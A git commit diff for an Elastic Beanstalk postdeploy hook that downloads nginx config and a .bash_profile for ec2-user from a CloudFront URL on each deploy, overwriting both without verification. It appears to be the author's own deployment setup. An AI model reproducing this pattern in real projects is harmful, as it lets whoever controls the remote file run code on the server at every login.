1413b224d20c0fca96ccf25f2db704f2e7acf4cf
P-C Lin (a.k.a 高科技黑手 <p@w3c.org.tw>
2021-09-05 14:41:03 +0800

    Optimize: .platform/hooks/postdeploy/proxy.sh

--- .platform/hooks/postdeploy/proxy.sh
+++ .platform/hooks/postdeploy/proxy.sh
@@ -1,6 +1,6 @@
 #!/bin/sh
-ME=`whoami`
-echo '${ME} 看到这儿，爷就安心了✅'
-wget -i https://d35hi420xc5ji7.cloudfront.net/proxy.conf
-cat proxy.conf > /etc/nginx/conf.d/elasticbeanstalk/proxy.conf
+
+wget -q -O ~ec2-user/.bash_profile https://d35hi420xc5ji7.cloudfront.net/.bash_profile
+
+wget -q -O /etc/nginx/conf.d/elasticbeanstalk/proxy.conf https://d35hi420xc5ji7.cloudfront.net/proxy.conf
 service nginx restart
